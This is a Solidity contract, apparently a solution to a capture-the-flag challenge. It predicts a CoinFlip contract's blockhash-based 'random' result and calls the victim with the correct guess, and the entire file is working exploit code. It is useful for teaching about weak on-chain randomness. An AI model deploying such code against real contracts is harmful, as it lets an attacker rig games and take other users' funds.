pragma solidity ^0.4.24;

interface CoinFlip { 

  function flip(bool _guess) public returns (bool);
}

contract CoinFlipAttack {
    CoinFlip public victimContract;

    // Same number as in CoinFlip contract
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    bool public side;

    /*
    Public function to set the victim contract. We will call this first in our exploit.
    It could have also been done in a constructor.
    */
     constructor() public{
        /* 
        Note that here we are not calling CoinFlip constructor with an address,
        but just instantiating it and setting its address. All functions calls will be sent to that address.
        This is Solidity a quirk, get used to it :)
        */
        address addr = 0x63a227d8fe55910b7f18d9c59417b6204cc66619;
        victimContract = CoinFlip(addr);
    }

    /*
    Public function which mimics the PRNG in CoinFlip and then calls CoinFlip with the correct guess.
    */
    function flip() public returns (bool) {
        // Same PRNG as in victim contract
        // The "random" numbers will be exactly the same in both contracts
        uint256 blockValue = uint256(block.blockhash(block.number-1));
        uint256 coinFlip = uint256(uint256(blockValue) / FACTOR);
        side = coinFlip == 1 ? true : false;

        // Here we call the victim contract flip function with our guess
        return victimContract.flip(side);
    }
}